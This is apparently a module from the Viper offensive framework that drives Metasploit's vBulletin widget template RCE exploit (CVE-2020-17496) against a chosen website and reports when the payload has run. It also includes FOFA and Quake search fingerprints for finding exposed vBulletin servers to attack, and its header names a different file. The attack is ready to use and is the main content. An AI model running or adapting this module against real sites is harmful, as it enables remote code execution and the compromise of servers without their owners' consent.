# -*- coding: utf-8 -*-
# @File  : PostMulitMsfBypassUAC.py
# @Date  : 2019/3/15
# @Desc  :


from Lib.ModuleAPI import *


class PostModule(BotMSFModule):
    NAME_ZH = "vbulletin widget模板命令执行"
    DESC_ZH = "模块使用CVE-2020-17496攻击选择的vbulletin网站.\n" \
              "建议选择php类型的payload"

    NAME_EN = "vbulletin widget template command execution"
    DESC_EN = "The module uses CVE-2020-17496 to attack the selected vbulletin website.\n" \
              "It is recommended to choose a php type of payload"
    MODULETYPE = TAG2TYPE.Bot_MSF_Exp
    README = ["https://www.yuque.com/vipersec/module/qp8b51"]
    REFERENCES = ["https://blog.exploitee.rs/2020/exploiting-vbulletin-a-tale-of-patch-fail/"]
    AUTHOR = ["Viper"]
    SEARCH = {
        "FOFA": 'icon_hash="-601665621"',
        "Quake": 'favicon:"c1f20852dd1caf078f49de77a2de8e3f"',
    }
    OPTIONS = register_options([
        OptionHander(),
    ])

    def __init__(self, ip, port, protocol, custom_param):
        super().__init__(ip, port, protocol, custom_param)
        self.type = "exploit"
        self.mname = "multi/http/vbulletin_widget_template_rce"

    def check(self):
        """执行前的检查函数"""
        result = self.set_payload_by_handler()
        if result is not True:
            return False, "无法解析Handler,请选择正确的监听", "Unable to resolve Handler, please select the correct handler"
        else:
            if self._port == 443:
                self.set_msf_option("SSL", True)
            else:
                self.set_msf_option("SSL", False)
            self.set_msf_option("RHOSTS", self._ip)
            self.set_msf_option("RPORT", self._port)
            return True, ""

    def callback(self, module_output):
        # 调用父类函数存储结果(必须调用)
        if "The target is vulnerable." in module_output:
            self.log_good("检测到网站存在CVE-2020-17496漏洞,执行payload",
                          "A CVE-2020-17496 vulnerability was detected on the website, and the payload was executed")
            return True
        else:
            self.log_error("网站不存在漏洞", "The website does not have vulnerabilities")
            return False
